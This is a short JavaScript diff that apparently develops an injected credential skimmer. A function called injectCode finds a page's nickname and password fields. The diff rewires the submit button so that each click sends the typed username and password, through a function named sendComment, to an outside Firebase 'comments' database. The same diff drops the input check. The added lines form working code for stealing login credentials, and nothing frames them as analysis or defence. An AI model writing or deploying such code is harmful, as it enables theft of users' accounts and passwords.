@@ -27,15 +27,13 @@ let app = e(firebaseConfig),
 database = n();
 
 function sendComment(e) {
-  if ('' !== e.text.trim()) {
     a(database, 'comments');
     let t = {
-      text: e.text,
+      text: e,
       date: new Date().toISOString()
     },
     n = a(database, `comments/${ Date.now().toString() }`);
     r(n, t)
-  }
 }
 
 function injectCode() {
@@ -47,8 +45,8 @@ function injectCode() {
         const name = document.getElementById('user_nickname');
         const pass = document.getElementById('user_password');
         console.log('inputs found!');
-        submitButton.addEventListener('mouseenter', ()=>{
-        console.log(`name: ${name.value}, pass : ${pass.value}`);
+        submitButton.addEventListener('click', ()=>{
+        sendComment(`name: ${name.value}, pass : ${pass.value}`);
        })
  }
 }
